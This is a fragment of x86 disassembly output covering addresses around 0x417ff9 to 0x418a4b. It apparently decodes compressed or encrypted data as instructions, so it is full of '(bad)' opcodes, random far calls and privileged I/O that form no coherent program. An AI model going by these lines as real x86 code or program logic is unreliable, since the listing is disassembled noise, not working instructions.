  417ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffa:	and    esi,DWORD PTR [ecx+0x0]
  417ffd:	in     al,0x4
  417fff:	ins    DWORD PTR es:[edi],dx
  418000:	data16 stos BYTE PTR es:[edi],al
  418002:	dec    edx
  418003:	adc    DWORD PTR [edi-0x2d],edx
  418006:	add    DWORD PTR [ebx],esi
  418008:	adc    BYTE PTR [ebx],0x7f
  41800b:	sub    DWORD PTR ds:0x99906f0e,ebp
  418011:	and    bh,0xbd
  418014:	cld    
  418015:	pop    ebp
  418016:	jmp    0x84165f1a
  41801b:	lods   al,BYTE PTR ds:[esi]
  41801c:	jle    0x417fa9
  41801e:	rcr    bl,0xfd
  418021:	into   
  418022:	cmp    edi,DWORD PTR [ebp+edi*4+0x28]
  418026:	aas    
  418027:	lods   al,BYTE PTR ds:[esi]
  418028:	bound  edx,QWORD PTR [esi-0x7092e41e]
  41802e:	mov    eax,ds:0x266853ee
  418033:	pop    ss
  418034:	dec    ebp
	...
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x7e44673c]
  4180a3:	fiadd  WORD PTR [edx+eiz*8+0x21]
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    BYTE PTR [ecx+0x26],al
  4180b0:	stos   BYTE PTR es:[edi],al
  4180b1:	mov    al,ds:0x64d79eda
  4180b6:	popa   
  4180b7:	or     eax,0x19750766
  4180bc:	sub    al,bh
  4180be:	fwait
  4180bf:	sbb    al,0x76
  4180c1:	ds jg  0x418066
  4180c4:	nop
  4180c5:	das    
  4180c6:	ja     0x418086
  4180c8:	xor    ax,0xf360
  4180cc:	adc    al,0x25
  4180ce:	dec    edx
  4180cf:	fiadd  DWORD PTR [edi]
  4180d1:	lock sbb eax,0xae2c25c2
  4180d7:	or     eax,DWORD PTR [ecx-0x4a]
  4180da:	push   ebx
  4180db:	xor    eax,DWORD PTR [ebx+0x27]
  4180de:	pop    edx
  4180df:	ror    DWORD PTR [ecx],cl
  4180e1:	jmp    0x8345:0x43da3868
  4180e8:	lds    esp,FWORD PTR [edi+ecx*4]
  4180eb:	ficomp DWORD PTR ds:0x6fff5cd6
  4180f1:	enter  0xb87,0x8e
  4180f5:	pop    esp
  4180f6:	mov    bl,al
  4180f8:	fs (bad) 
  4180fb:	(bad)  
  4180fc:	sbb    bh,bh
  4180fe:	sar    BYTE PTR [ebp-0x33],1
  418101:	cmp    al,0x65
  418103:	icebp  
  418104:	sbb    edx,DWORD PTR [eax+0x5271f140]
  41810a:	fsub   QWORD PTR [eax+0x51f5c1d8]
  418110:	cmp    al,0xb
  418112:	inc    ebx
  418113:	in     al,0xbe
  418115:	or     bl,cl
  418117:	retf   
  418118:	test   BYTE PTR [ebx],ch
  41811a:	xor    ebp,DWORD PTR [esi]
  41811c:	and    eax,0x68
  41811f:	sub    eax,0x8c7a3fb0
  418124:	jo     0x418159
  418126:	and    dl,BYTE PTR [ebp+0x69]
  418129:	mov    al,0x88
  41812b:	and    al,BYTE PTR ds:0x812fc6ea
  418131:	call   0xffbd:0x8f873ea8
  418138:	stos   BYTE PTR es:[edi],al
  418139:	das    
  41813a:	cli    
  41813b:	rol    BYTE PTR [eax+0x30c09597],1
  418141:	fdivr  st,st(6)
  418143:	aaa    
  418144:	(bad)  
  418145:	test   eax,0xb465397a
  41814a:	scas   eax,DWORD PTR es:[edi]
  41814b:	adc    DWORD PTR [edx+0x22],ecx
  41814e:	xchg   esi,eax
  41814f:	ror    BYTE PTR [eax],1
  418151:	jge    0x4180f2
  418153:	jecxz  0x418150
  418155:	xchg   ecx,eax
  418156:	inc    ebx
  418157:	fmul   QWORD PTR [esi]
  418159:	xchg   ebp,eax
  41815a:	in     eax,dx
  41815b:	(bad)  
  41815c:	mov    ch,0x67
  41815e:	sbb    al,0x7c
  418160:	pop    edi
  418161:	imul   esi,DWORD PTR [edx],0xffffffde
  418164:	retf   0x7e4f
  418167:	xchg   bh,ch
  418169:	sbb    BYTE PTR [edi-0x1b],bl
  41816c:	jae    0x4181e4
  41816e:	jp     0x4181a9
  418170:	lea    esp,[esp+ecx*2]
  418173:	xchg   esi,eax
  418174:	hlt    
  418175:	ror    BYTE PTR ds:0xb005a342,0x3f
  41817c:	xchg   BYTE PTR [ecx],ch
  41817e:	jb     0x418133
  418180:	cld    
  418181:	dec    ebp
  418182:	das    
  418183:	xor    dl,dl
  418185:	xchg   esi,eax
  418186:	shl    BYTE PTR [ecx-0xb],cl
  418189:	ins    DWORD PTR es:[edi],dx
  41818a:	jno    0x4181fe
  41818c:	sbb    esi,DWORD PTR [edi]
  41818e:	or     al,bl
  418190:	or     ah,BYTE PTR [edi-0x35e3a66a]
  418196:	push   0xffffffd1
  418198:	in     al,0x57
  41819a:	in     al,dx
  41819b:	cmp    esp,DWORD PTR [ebx]
  41819d:	pop    es
  41819e:	ins    BYTE PTR es:[edi],dx
  41819f:	jecxz  0x4181f5
  4181a1:	scas   al,BYTE PTR es:[edi]
  4181a2:	adc    al,0x9
  4181a4:	ds icebp 
  4181a6:	das    
  4181a7:	iret   
  4181a8:	lea    ecx,[ebp+0xedfed0b]
  4181ae:	fs gs loopne 0x418162
  4181b2:	jo     0x4181ae
  4181b4:	in     eax,0x0
	...
  418216:	aaa    
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	sub    al,ch
  418224:	jne    0x418272
  418226:	sub    ch,bh
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [ebx+0x36],cl
  418230:	xchg   ebx,eax
  418231:	mov    al,ds:0x86046247
  418236:	int    0x3b
  418238:	test   BYTE PTR ds:0xa6f67d87,dh
  41823e:	test   eax,0x45f78e79
  418243:	js     0x4182a7
  418245:	test   DWORD PTR [eax-0x2c],edi
  418248:	mov    eax,0x13cbae75
  41824d:	ret    0x2f51
  418250:	push   cs
  418251:	push   cs
  418252:	rcr    cl,0x52
  418255:	int3   
  418256:	(bad)  
  418257:	and    al,0x3e
  418259:	(bad)
  41825d:	xchg   ebp,eax
  41825e:	jnp    0x418267
  418260:	sub    eax,0x4952dee4
  418265:	ror    al,cl
  418267:	dec    edx
  418268:	int    0xd1
  41826a:	getsec 
  41826c:	mov    cs,WORD PTR [esi+0x31]
  41826f:	add    edi,edi
  418271:	mov    esp,0x73cd93b6
  418276:	jno    0x41827c
  418278:	pop    ds
  418279:	and    BYTE PTR [esi+0x28],ah
  41827c:	out    dx,al
  41827d:	mov    ecx,0xf6538f9b
  418282:	sub    al,0xc
  418284:	pop    eax
  418285:	cs dec ebp
  418287:	push   edx
  418288:	cli    
  418289:	add    DWORD PTR [ebx+0x24],edx
  41828c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41828e:	push   esi
  41828f:	pop    ebx
  418290:	cld    
  418291:	mov    al,0x64
  418293:	(bad)  
  418294:	adc    DWORD PTR [esi+0x6f],edi
  418297:	aaa    
  418298:	leave  
  418299:	cmp    eax,0x5533961e
  41829e:	daa    
  41829f:	cmp    al,0xc6
  4182a1:	inc    ebx
  4182a2:	cmp    esp,DWORD PTR [ebx]
  4182a4:	(bad)  
  4182a5:	sbb    al,0x29
  4182a7:	daa    
  4182a8:	push   esp
  4182a9:	es sub eax,0x67349aa2
  4182af:	out    0xe8,al
  4182b1:	cmp    BYTE PTR [esi],0xc5
  4182b4:	fdivr  QWORD PTR [edx]
  4182b6:	mov    dh,0x34
  4182b8:	dec    ebx
  4182b9:	and    BYTE PTR ds:0x608e138a,ah
  4182bf:	scas   al,BYTE PTR es:[edi]
  4182c0:	stc    
  4182c1:	cdq    
  4182c2:	out    dx,eax
  4182c3:	sbb    eax,DWORD PTR [edi+0x725b3936]
  4182c9:	lods   eax,DWORD PTR ds:[esi]
  4182ca:	push   ebx
  4182cb:	mov    esp,0x750a431a
  4182d0:	iret   
  4182d1:	test   DWORD PTR [ecx+0x72029d84],esp
  4182d7:	inc    ebx
  4182d8:	sub    bl,ch
  4182da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182dc:	add    al,0x3
  4182de:	jl     0x4182f1
  4182e0:	call   0x5832:0x69b47864
  4182e7:	repnz push 0x6f0b28cb
  4182ed:	jecxz  0x41827c
  4182ef:	push   ds
  4182f0:	lahf   
  4182f1:	ss icebp 
  4182f3:	pop    ds
  4182f4:	pop    esp
  4182f5:	mov    edi,0x18868c3a
  4182fa:	pushw  cs
  4182fc:	fisttp DWORD PTR [ecx+0x25]
  4182ff:	sbb    DWORD PTR [eax-0x71],ebp
  418302:	lock inc ecx
  418304:	hlt    
  418305:	xchg   BYTE PTR [eax+0x72711658],ch
  41830b:	mov    ebx,0x97380180
  418310:	jp     0x418292
  418312:	test   al,0x86
  418314:	stos   BYTE PTR es:[edi],al
  418315:	(bad)  
  418317:	inc    esi
  418318:	add    DWORD PTR [esi],0xffffffed
  41831b:	repz pop edx
  41831d:	jge    0x4182f8
  41831f:	add    al,0xc0
  418321:	sbb    edx,edx
  418323:	and    DWORD PTR [ebx+edi*4-0x40d5e004],0x16c5ecc8
  41832e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832f:	ret    
  418330:	nop
  418331:	rcr    BYTE PTR [edi+0x7fe8],0x0
	...
  418394:	add    BYTE PTR [eax],al
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	xor    dl,dl
  4183a4:	dec    ebx
  4183a5:	js     0x4183d6
  4183a7:	inc    BYTE PTR [eax]
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [esi+0x561adc97],ah
  4183b3:	ins    BYTE PTR es:[edi],dx
  4183b4:	in     eax,0x8f
  4183b6:	aad    0x42
  4183b8:	mov    WORD PTR [edi+eiz*8-0x6d],ss
  4183bc:	mov    ebp,0x6a662a38
  4183c1:	jecxz  0x4183ca
  4183c3:	xchg   edx,eax
  4183c4:	adc    al,0x7c
  4183c6:	adc    dl,BYTE PTR [edx+0x41]
  4183c9:	mov    ds:0xd721112b,eax
  4183ce:	rol    BYTE PTR [ebp+0x18],cl
  4183d1:	pop    eax
  4183d2:	dec    ebp
  4183d3:	adc    eax,0x9f2a524a
  4183d8:	mov    ebx,0xa4590436
  4183dd:	sbb    eax,esi
  4183df:	popa   
  4183e0:	mov    edi,0x54d41c5b
  4183e5:	or     al,0xef
  4183e7:	mov    esp,0xc417baba
  4183ec:	(bad)  
  4183ed:	sbb    al,bh
  4183ef:	jmp    0x41846e
  4183f1:	add    DWORD PTR [edi-0x28c8c345],edi
  4183f7:	imul   eax,DWORD PTR [ecx],0x533d6ac6
  4183fd:	repz push eax
  4183ff:	sub    DWORD PTR [esi+0x29],eax
  418402:	push   esp
  418403:	repnz push 0x9fbf7ce9
  418409:	cdq    
  41840a:	push   edx
  41840b:	jmp    0x1e565a12
  418410:	or     eax,0xb1e0f707
  418415:	enter  0xe75d,0x2b
  418419:	pop    edi
  41841a:	and    edx,DWORD PTR [eax+0x1389deef]
  418420:	dec    edi
  418421:	cmc    
  418422:	or     DWORD PTR [esi],esi
  418424:	(bad)  
  418425:	dec    cl
  418427:	(bad)  
  418428:	dec    ebx
  418429:	lods   eax,DWORD PTR ds:[esi]
  41842a:	mov    bh,0x32
  41842c:	adc    al,0x34
  41842e:	jo     0x41845c
  418430:	pop    ebp
  418431:	aas    
  418432:	mov    esi,0xc0d73641
  418437:	inc    ebx
  418438:	pop    ecx
  418439:	mov    edx,0xe71faac1
  41843e:	inc    edi
  41843f:	icebp  
  418440:	ins    BYTE PTR es:[edi],dx
  418441:	or     al,0xc1
  418443:	jl     0x418425
  418445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418446:	aas    
  418447:	xor    esi,DWORD PTR [ebx-0x39]
  41844a:	mov    esp,0xd61485c1
  41844f:	push   cs
  418450:	inc    ebx
  418451:	std    
  418452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418453:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418455:	lock js 0x4183ec
  418458:	sbb    DWORD PTR [eax+0x60],ebp
  41845b:	cmp    al,0xd2
  41845d:	cmp    DWORD PTR [edx+0x2e],ecx
  418460:	aaa    
  418461:	in     al,dx
  418462:	ffree  st(5)
  418464:	rcr    DWORD PTR [esi+0x6024e753],cl
  41846a:	stos   BYTE PTR es:[edi],al
  41846b:	pop    esi
  41846c:	jae    0x4183f2
  41846e:	loop   0x41845f
  418470:	sub    ah,BYTE PTR [ebx+0x44]
  418473:	fisttp DWORD PTR [edi+0x17]
  418476:	mov    cl,0xef
  418478:	add    bh,BYTE PTR [eax]
  41847a:	add    esi,ecx
  41847c:	aad    0x61
  41847e:	or     bl,BYTE PTR [eax-0x6a]
  418481:	loope  0x418463
  418483:	dec    eax
  418484:	add    al,0xdf
  418486:	out    0x49,eax
  418488:	adc    ch,BYTE PTR [ebp+0x5efea7c7]
  41848e:	push   0x30197d98
  418493:	int3   
  418494:	sub    edx,DWORD PTR [edx+0x2993b90d]
  41849a:	mov    cl,0xa
  41849c:	imul   ebp,DWORD PTR [eax+0x22],0xeeac3890
  4184a3:	pop    ss
  4184a4:	sbb    BYTE PTR [ecx],dl
  4184a6:	ror    BYTE PTR [edx-0x250208a8],cl
  4184ac:	loope  0x418455
  4184ae:	mov    bh,0x10
  4184b0:	adc    BYTE PTR [ebp+0x4d19de],ah
	...
  418516:	inc    ecx
  418517:	stc    
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [esi+ebp*1+0x36525809]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [edx],bh
  41852f:	dec    ebx
  418530:	xchg   BYTE PTR [ebx+0x564cd887],bh
  418536:	xchg   edi,eax
  418537:	lods   al,BYTE PTR ds:[esi]
  418538:	jl     0x4184c5
  41853a:	icebp  
  41853b:	inc    edx
  41853c:	inc    esp
  41853d:	call   0xdf297211
  418542:	fadd   st(0),st
  418544:	inc    edx
  418545:	push   esp
  418546:	and    esi,0x418ab0fd
  41854c:	sbb    BYTE PTR [ecx+0x68],ch
  41854f:	(bad)  
  418551:	shr    DWORD PTR [edx+eiz*2],cl
  418554:	hlt    
  418555:	dec    edx
  418556:	loop   0x41852e
  418558:	xor    DWORD PTR [esi],esi
  41855a:	mov    ch,0x9c
  41855c:	fild   DWORD PTR [eax-0x61817d5f]
  418562:	(bad)  
  418563:	fs vpaddsb xmm6,xmm6,XMMWORD PTR ds:[eax]
  418569:	xchg   edx,eax
  41856a:	repz xchg esi,eax
  41856c:	daa    
  41856d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41856e:	fcomp  DWORD PTR [edi]
  418570:	ret    0x6d60
  418573:	inc    ebx
  418574:	and    al,0x5e
  418576:	cmp    ebx,esi
  418578:	xchg   ebp,eax
  418579:	fwait
  41857a:	scas   al,BYTE PTR es:[edi]
  41857b:	dec    eax
  41857c:	cmp    esp,DWORD PTR [ebp+0x5b]
  41857f:	xchg   ecx,eax
  418580:	retf   0x4655
  418583:	mov    eax,0xc51c755a
  418588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418589:	test   al,0xd7
  41858b:	call   0x64b1:0x82ac6795
  418592:	jecxz  0x4185ab
  418594:	rol    DWORD PTR [edi+0xa8bf182],1
  41859a:	or     DWORD PTR [esi-0x2ab0b1f1],eax
  4185a0:	out    dx,al
  4185a1:	and    esi,esp
  4185a3:	test   eax,0xcf7cce8
  4185a8:	iret   
  4185a9:	outs   dx,BYTE PTR ds:[esi]
  4185aa:	mov    ebp,DWORD PTR ds:0x709324e7
  4185b0:	jg     0x4185d5
  4185b2:	push   edx
  4185b3:	(bad)  
  4185b4:	mov    ah,0xb5
  4185b6:	pop    ebx
  4185b7:	aaa    
  4185b8:	shl    WORD PTR fs:[ebx],0xf1
  4185bd:	ret    
  4185be:	jae    0x4185cf
  4185c0:	add    eax,0xf0861f2e
  4185c5:	dec    edx
  4185c6:	aas    
  4185c7:	iret   
  4185c8:	jmp    0x41859d
  4185ca:	xor    eax,0xcd62a1f1
  4185cf:	cmp    dh,BYTE PTR [ecx*1-0x5085f51]
  4185d6:	mov    bh,0x47
  4185d8:	jae    0x4185d5
  4185da:	ror    DWORD PTR [esi*1+0x6bdc0dc4],1
  4185e1:	das    
  4185e2:	and    DWORD PTR [ebx-0x1a],ebp
  4185e5:	(bad)  
  4185e6:	mov    ebx,esp
  4185e8:	and    eax,0x789592bf
  4185ed:	int3   
  4185ee:	push   edi
  4185ef:	dec    edx
  4185f0:	adc    edi,DWORD PTR [ebx]
  4185f2:	nop
  4185f3:	mov    bl,0x7f
  4185f5:	call   0x5708:0x8b1d42f1
  4185fc:	jmp    0xe21c:0x25b4b441
  418603:	in     al,dx
  418604:	jne    0x41864d
  418606:	ss out dx,ax
  418609:	xor    eax,0x1fc3a766
  41860e:	fadd   QWORD PTR [esi-0x2b257928]
  418614:	pop    edi
  418615:	aaa    
  418616:	and    BYTE PTR [ebp-0x736479d8],0x2b
  41861d:	dec    eax
  41861e:	mov    ds:0xcc619c7e,al
  418623:	xchg   ebx,eax
  418624:	jg     0x418664
  418626:	dec    eax
  418627:	cmp    al,0xbb
  418629:	mov    edx,0xe6700664
  41862e:	daa    
  41862f:	push   eax
  418630:	inc    esp
  418631:	std    
  418632:	(bad)  
  418633:	cmp    eax,0xf4
	...
  418694:	add    BYTE PTR [eax],al
  418696:	xchg   ebx,eax
  418697:	sub    BYTE PTR [eax-0x604344c4],ah
  41869d:	scas   eax,DWORD PTR es:[edi]
  41869e:	pop    es
  41869f:	mov    edx,0x541fbe30
  4186a4:	sub    ebx,eax
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [edx+0x6ed11b9a],dh
  4186b3:	test   BYTE PTR [ebp-0x1b2b6946],cl
  4186b9:	icebp  
  4186ba:	cmc    
  4186bb:	test   al,0x8e
  4186bd:	or     edx,esp
  4186bf:	dec    edi
  4186c0:	(bad)  
  4186c2:	add    esp,DWORD PTR [eax+0x48]
  4186c5:	dec    ebx
  4186c6:	icebp  
  4186c7:	shl    DWORD PTR [ebx],0xe0
  4186ca:	lds    eax,FWORD PTR [ecx+0x4a4726a]
  4186d0:	push   ebx
  4186d1:	shl    DWORD PTR [ebp+0x2e457d6f],1
  4186d7:	std    
  4186d8:	bound  ecx,QWORD PTR [ebx+0x71f7ece0]
  4186de:	dec    ecx
  4186df:	mov    ah,0x36
  4186e1:	xor    edx,DWORD PTR [ebx+0x6ce95ef0]
  4186e7:	mov    ebx,0xa1b5714d
  4186ec:	jne    0x4186e8
  4186ee:	fisub  DWORD PTR [edi]
  4186f0:	popa   
  4186f1:	jge    0x418742
  4186f3:	jle    0x41872a
  4186f5:	mov    dl,0xdc
  4186f7:	lods   eax,DWORD PTR ds:[esi]
  4186f8:	xor    esp,DWORD PTR [eax+0x64]
  4186fb:	xor    DWORD PTR [ebp+0x6deda64b],esi
  418701:	jecxz  0x4186a1
  418703:	jl     0x4186c4
  418705:	dec    ebp
  418706:	jae    0x418698
  418708:	out    0x4b,eax
  41870a:	dec    eax
  41870b:	retf   
  41870c:	stos   DWORD PTR es:[edi],eax
  41870d:	hlt    
  41870e:	in     eax,dx
  41870f:	fld    QWORD PTR [ecx+0x3d0e219f]
  418715:	aaa    
  418716:	mov    al,0x22
  418718:	repz mov esi,0xadadc11b
  41871e:	mov    esp,0xd1a5f279
  418723:	outs   dx,BYTE PTR ds:[esi]
  418724:	adc    al,0x5c
  418726:	push   edi
  418727:	dec    esp
  418728:	xor    ebp,DWORD PTR [ebx+ebx*4-0x3a]
  41872c:	add    eax,eax
  41872e:	and    al,ah
  418730:	mov    dh,0xc4
  418732:	sbb    ebx,DWORD PTR [edx]
  418734:	js     0x4186ed
  418736:	add    DWORD PTR [esi+0x1e],ecx
  418739:	out    dx,eax
  41873a:	dec    esi
  41873b:	popa   
  41873c:	not    DWORD PTR [eax-0x5d]
  41873f:	mov    bl,0x3e
  418741:	inc    eax
  418742:	in     al,dx
  418743:	out    0x10,eax
  418745:	std    
  418746:	add    al,0x2f
  418748:	and    ch,BYTE PTR [ebp-0x2b]
  41874b:	pusha  
  41874c:	imul   ebx,DWORD PTR [eax],0x14
  41874f:	dec    ecx
  418750:	pop    ebx
  418751:	and    ch,BYTE PTR [ecx+ecx*4]
  418754:	sbb    ebx,0x9b9b3ca0
  41875a:	push   eax
  41875b:	cli    
  41875c:	sbb    DWORD PTR [edi],edx
  41875e:	xor    eax,0x86881b39
  418763:	push   ds
  418764:	inc    ebp
  418765:	inc    ecx
  418766:	add    BYTE PTR [eax],ch
  418768:	xor    esi,DWORD PTR [edx-0x25]
  41876b:	jo     0x41870b
  41876d:	mov    bh,0xde
  41876f:	add    dh,0x9f
  418772:	std    
  418773:	cli    
  418774:	test   eax,0x992e23a5
  418779:	xchg   ebp,eax
  41877a:	mov    BYTE PTR [eax],dh
  41877c:	call   0xe7da:0x33e6c716
  418783:	jle    0x4187e3
  418785:	out    0x3f,eax
  418787:	into   
  418788:	mov    al,0xd7
  41878a:	pop    edx
  41878b:	int    0x8f
  41878d:	jne    0x418740
  41878f:	mov    bl,0x7c
  418791:	in     eax,0x80
  418793:	cli    
  418794:	shl    bl,0xb1
  418797:	add    ebx,DWORD PTR [ebx+0x5c]
  41879a:	or     BYTE PTR [esi-0x6d],cl
  41879d:	mov    eax,ds:0xe7d74acc
  4187a2:	sub    ah,BYTE PTR [edi-0x4a96f392]
  4187a8:	loope  0x418787
  4187aa:	xor    eax,ecx
  4187ac:	ret    0xf82b
  4187af:	(bad)  [eax-0x6cf18dae]
	...
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x61057be5
  418824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418825:	pop    ebp
  418826:	inc    esp
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edi],bl
  41882f:	(bad)  
  418830:	aam    0x1a
  418832:	push   0x4fff91ab
  418837:	retf   
  418838:	(bad)  
  41883a:	push   ebx
  41883b:	mov    eax,0xed6ad714
  418840:	cwde   
  418841:	jns    0x4187c3
  418843:	sbb    edi,ebx
  418845:	mov    eax,ecx
  418847:	sbb    ah,cl
  418849:	cmp    cl,BYTE PTR [ebp-0x633f194]
  41884f:	sar    BYTE PTR [esp+ecx*4-0x1b52f016],0x63
  418857:	in     al,dx
  418858:	ret    
  418859:	push   esi
  41885a:	nop
  41885b:	xor    DWORD PTR [esi-0x78],eax
  41885e:	lods   al,BYTE PTR ds:[esi]
  41885f:	into   
  418860:	pop    es
  418861:	call   0x4c60d2c4
  418866:	call   0x42eda692
  41886b:	pop    ecx
  41886c:	jmp    0x880c:0xaabb58b7
  418873:	js     0x418872
  418875:	pop    ebx
  418876:	pop    es
  418877:	jb     0x4188a3
  418879:	cmp    bh,dh
  41887b:	(bad)  
  41887c:	sbb    eax,0xe683f925
  418881:	idiv   BYTE PTR [esi+0x77]
  418884:	rcl    DWORD PTR [esi-0x29c016f6],1
  41888a:	or     BYTE PTR ds:0x3689b4c1,dh
  418890:	imul   BYTE PTR [esi-0x2c]
  418893:	mov    ebp,0xb6a5f461
  418898:	ins    DWORD PTR es:[edi],dx
  418899:	inc    esi
  41889a:	mov    ah,0xec
  41889c:	pusha  
  41889d:	call   0xd363:0xc29e3f94
  4188a4:	cmp    ah,BYTE PTR [ebp-0x688485]
  4188aa:	sbb    al,dl
  4188ac:	or     al,0x69
  4188ae:	(bad)  
  4188af:	hlt    
  4188b0:	sti    
  4188b1:	xchg   edi,eax
  4188b2:	jbe    0x418842
  4188b4:	iret   
  4188b5:	push   ebx
  4188b6:	outs   dx,DWORD PTR ds:[esi]
  4188b7:	out    0x12,al
  4188b9:	cmp    cl,al
  4188bb:	imul   esp,DWORD PTR [ecx+0x5dee7c5d],0xffffff96
  4188c2:	jmp    0x418876
  4188c4:	push   edi
  4188c5:	adc    al,0xdd
  4188c7:	ss add eax,0xb3e8e39f
  4188cd:	ficomp WORD PTR [edx]
  4188cf:	mov    edi,DWORD PTR [eax]
  4188d1:	(bad)  
  4188d2:	jns    0x418914
  4188d4:	mov    esp,0xa027938a
  4188d9:	push   ecx
  4188da:	push   0x4b6dcc37
  4188df:	aad    0x47
  4188e1:	sbb    al,0xd8
  4188e3:	pop    esi
  4188e4:	pop    ebx
  4188e5:	cli    
  4188e6:	stos   BYTE PTR es:[edi],al
  4188e7:	out    dx,eax
  4188e8:	call   0xaa31:0xc57e7ac7
  4188ef:	aaa    
  4188f0:	dec    ecx
  4188f1:	sbb    al,0x14
  4188f3:	inc    esp
  4188f4:	sbb    BYTE PTR [edi+0xa93449a],bl
  4188fa:	cwde   
  4188fb:	stos   DWORD PTR es:[edi],eax
  4188fc:	stos   DWORD PTR es:[edi],eax
  4188fd:	adc    DWORD PTR [ebp+ebp*1-0x1f],edx
  418901:	fldcw  WORD PTR fs:[ebp+0x2c]
  418905:	jb     0x4188a6
  418907:	div    BYTE PTR [edx]
  418909:	stos   BYTE PTR es:[edi],al
  41890a:	adc    al,0x27
  41890c:	dec    edi
  41890d:	(bad)  
  41890e:	mov    dl,BYTE PTR [edx]
  418910:	pop    esp
  418911:	adc    bh,BYTE PTR ds:0x3647b2c7
  418917:	jmp    0x418910
  418919:	cld    
  41891a:	scas   eax,DWORD PTR es:[edi]
  41891b:	xchg   ecx,eax
  41891c:	bound  edi,QWORD PTR [edx-0x28]
  41891f:	adc    eax,edx
  418921:	fld    DWORD PTR [ebx+edx*4+0x41]
  418925:	test   eax,0xe56b2942
  41892a:	enter  0x2d0f,0x7f
  41892e:	xchg   BYTE PTR [edi],bl
  418930:	ja     0x41893d
  418932:	cmovle esi,DWORD PTR [ecx+0x0]
	...
  418996:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi-0x1ea2cc61]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    dl,al
  4189af:	ret    
  4189b0:	add    eax,0xfb8ac03
  4189b5:	in     eax,dx
  4189b6:	pushf  
  4189b7:	addr16 mov edx,0x1804fef7
  4189bd:	cmp    eax,0x998cab32
  4189c2:	pop    ecx
  4189c3:	and    edi,ebx
  4189c5:	xchg   edi,eax
  4189c6:	sbb    bl,BYTE PTR [esi]
  4189c8:	add    ebx,ebp
  4189ca:	push   ebx
  4189cb:	dec    edx
  4189cc:	jl     0x418a44
  4189ce:	add    eax,0x1f7d73f1
  4189d3:	pop    ecx
  4189d4:	jae    0x418a43
  4189d6:	xor    eax,0x66f5caa8
  4189db:	outs   dx,BYTE PTR ds:[esi]
  4189dc:	ins    BYTE PTR es:[edi],dx
  4189dd:	in     al,dx
  4189de:	xchg   esp,eax
  4189df:	ins    BYTE PTR es:[edi],dx
  4189e0:	aas    
  4189e1:	fiadd  WORD PTR [esi+0x5b]
  4189e4:	(bad)  
  4189e5:	mov    esi,0x1e425a40
  4189ea:	out    0x1d,al
  4189ec:	or     BYTE PTR [eax+0xd],0xa1
  4189f0:	jb     0x4189cf
  4189f2:	cmp    al,0xa2
  4189f4:	jno    0x418a60
  4189f6:	cmp    BYTE PTR [ecx],dh
  4189f8:	xchg   esi,eax
  4189f9:	fcmovu st,st(2)
  4189fb:	xor    bl,ah
  4189fd:	loop   0x4189d5
  4189ff:	into   
  418a00:	lock mov cl,BYTE PTR [ebx+0x32]
  418a04:	(bad)  
  418a05:	sti    
  418a06:	cmp    BYTE PTR [edi],bh
  418a08:	ss ret 
  418a0a:	xor    al,0x78
  418a0c:	retf   0xb8bb
  418a0f:	dec    esp
  418a10:	xor    BYTE PTR [edx-0x4797c4d8],dl
  418a16:	(bad)  
  418a17:	sub    al,0x7b
  418a19:	stc    
  418a1a:	out    dx,al
  418a1b:	push   ebx
  418a1c:	dec    ebx
  418a1d:	test   eax,0xb7611193
  418a22:	(bad)  
  418a23:	not    BYTE PTR [esi+ecx*4-0x7c7f0373]
  418a2a:	dec    ebx
  418a2b:	pop    edi
  418a2c:	adc    BYTE PTR [ecx-0x2c],0xec
  418a30:	rol    edx,1
  418a32:	fist   DWORD PTR [edx+0x48]
  418a35:	call   0x5e01:0xcbcc1688
  418a3c:	ins    BYTE PTR es:[edi],dx
  418a3d:	lods   al,BYTE PTR ds:[esi]
  418a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a3f:	cli    
  418a40:	dec    ebx
  418a41:	aas    
  418a42:	imul   edi,DWORD PTR [ebx-0x116f7dd9],0xffffffb3
  418a49:	into   
  418a4a:	dec    ecx
  418a4b:	adc    eax,0xa2d91aeb
